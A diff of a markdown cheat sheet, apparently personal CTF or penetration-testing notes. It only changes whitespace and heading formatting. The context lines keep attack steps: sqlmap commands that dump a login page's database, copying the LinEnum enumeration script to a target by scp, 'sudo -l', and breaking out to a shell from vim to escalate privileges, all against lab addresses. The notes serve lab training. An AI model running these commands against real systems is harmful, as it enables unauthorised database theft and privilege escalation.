@@ -1,5 +1,3 @@
-
-
 ## Reconaissance
 
 ##### nmap scanning
@@ -21,6 +19,8 @@ sqlmap -u {weburl, http://10.10.60.252/administrator.php>} --forms --dump --dbms
 sqlmap --tables -T users --dump
 ```
 
+
+
 ## Foothold
 
 ##### connecting ssh
@@ -33,17 +33,21 @@ ssh {user}@{ip} -p {port}
 scp {path to linenum} {user}@{host}:{path} #Example: scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp
 ```
 
-## PRIVELEGE ESCALATION
+
+
+## Privelege Escalation
 
 ##### sudo-able commands
 
 ```bash
 sudo -l
 ```
-######running bash in vim
+###### running bash in vim
 ```
 :shell 
 ```
+
+
 
 ## MISC
 
